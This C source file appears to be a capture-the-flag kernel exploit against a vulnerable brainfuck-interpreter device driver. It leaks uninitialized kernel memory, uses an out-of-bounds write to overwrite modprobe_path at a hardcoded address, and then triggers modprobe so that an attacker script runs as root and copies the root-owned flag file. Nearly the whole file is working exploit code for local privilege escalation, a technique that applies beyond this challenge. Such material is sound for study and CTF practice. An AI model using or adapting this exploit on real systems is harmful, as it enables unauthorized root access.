#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <string.h>

// This ioctl will let the brain fuck
// interpretation starts.
// From the 500b sized chunk to our defined size
// chunk.
#define IOCTL_BF 0xbaadc0d3

// Copy to user from node_sized_p (see struct below)
// with size (size) to userland.
// We will use it to get leaks
// as the chunk is not unitialized at allocation.
#define IOCTL_READ 0xd00dc0d3

// Need to start with this ioctl
// Just to kvmalloc_node() our ctx (size 0x20)
/*
 * struct ctx{
 *	+0x0  int magic
 *	+0x4  NULL;
 *	+0x8  unsigned long size;
 *	+0x10 char* bf_payload;
 *	+0x18 char* node_sized_p;
 * };
 */
#define IOCTL_WRITE 0xac1dc0d3

struct write_struct{
	unsigned long header;
	unsigned long size;

} init_write;

void prepare_modprobe(){
	system("echo -ne '#!/bin/sh\n/bin/cat /root/flag > /home/user/flag\nchmod 777 /home/user/flag' > /home/user/pwn");
	system("chmod a+x /home/user/pwn");
	system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/o");
	system("chmod a+x /home/user/o");
}

void modprobe_trigger(){
	// When calling a file with unknown magic bytes
	// modprobe will call our provided path with root privs.
	system("/home/user/o");
	system("/bin/cat /home/user/flag");
}

int main(){
	int i;
	char bf_payload[500];

	// open the device.
	int fd = open("/dev/brainfuck64", O_RDWR);

	// It should be this value
	// else we will not be able to accomplish our task.
	init_write.header = 0x34364642;


	// Define the size we want to allocate for node_sized_p.
	init_write.size = 0x20;

	// Do an ioctl to initialize ctx with our defined chunk
	// And get leaks just after that
	ioctl(fd, IOCTL_WRITE, &init_write);

	// Trying to leak something out of
	// Non unitialized chunk.
	// And it's not necessary here because kALSR is disabled.
	unsigned long buf[init_write.size / sizeof(unsigned long)];
	memset(buf, 0, sizeof(buf));
	ioctl(fd, IOCTL_READ, &buf);
	for(i=0; i<(init_write.size / sizeof(unsigned long)); i++)
		printf("QWORD %d \t %p\n", i, buf[i]);

	// Setup our brainfuck payload
	memset(bf_payload, 0, sizeof(bf_payload));

	// Go out of bound from our chunk.	
	// modprobe_path is here 0xffffffff81a3f7a0.
	// As I said kASLR is disabled we can hardcode
	// it in our exploit.

	memset(bf_payload, '>', init_write.size);
	strncat(bf_payload, "^\x90\xf7\xa3\x81\xff\xff\xff\xff", 9);

	
	// Start interpreting our bf payload.
	printf("BF : %s\n", bf_payload);
	ioctl(fd, IOCTL_BF, &bf_payload);

	// Write another time to corrupt modprobe_path
	// with a path of our choosing.
	ioctl(fd, IOCTL_WRITE, &init_write);
	
	// This time we need to give bf instructions to
	// change modprobe_path.
	memset(bf_payload, 0, sizeof(bf_payload));
	memset(bf_payload, '>', 0x10);
	strncpy(bf_payload+0x10, "^/home/us", 9);
	strncpy(bf_payload+0x10+0x9, "^er/pwn\x00\x00", 9);

	printf("BF : %s\n", bf_payload);
	ioctl(fd, IOCTL_BF, &bf_payload);
	
	prepare_modprobe();
	modprobe_trigger();
	
	// Close the device when finish.
	close(fd);

	return 0;

}
